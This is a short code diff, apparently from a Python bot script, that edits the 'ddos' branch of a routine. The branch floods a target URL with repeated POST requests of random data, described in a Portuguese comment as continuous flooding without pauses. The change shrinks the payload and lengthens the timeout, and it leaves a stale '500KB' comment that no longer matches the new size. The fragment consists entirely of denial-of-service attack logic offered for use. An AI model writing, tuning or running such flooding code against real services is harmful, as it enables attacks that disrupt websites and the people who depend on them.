@@ -44,8 +44,8 @@ def bot_routine():
                 
             elif bot_type == 'ddos':
                 # Flooding contínuo sem pausas
-                payload = {'data': "".join(random.choices('abcdef0123456789', k=512000))} # 500KB
-                session.post(f"{target_url}", json=payload, timeout=2)
+                payload = {'data': "".join(random.choices('abcdef0123456789', k=10240))} # 500KB
+                session.post(f"{target_url}", json=payload, timeout=10)
                 
         except Exception as e:
             print(f"[!] Erro de conexão com o alvo: {str(e)[:50]}...")
